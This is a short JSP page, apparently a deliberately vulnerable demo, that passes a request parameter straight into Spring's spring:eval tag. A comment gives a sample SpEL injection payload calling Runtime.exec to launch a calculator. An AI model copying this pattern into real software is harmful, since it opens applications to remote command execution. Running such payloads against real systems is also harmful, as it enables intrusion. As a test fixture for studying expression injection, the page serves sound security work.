<%@ taglib prefix="spring" uri="http://www.springframework.org/tags" %>

<h1>Spring Eval</h1>
<%--?vulnerable=T(java.lang.Runtime).getRuntime().exec("calc")--%>
<spring:eval expression="${param.vulnerable}" />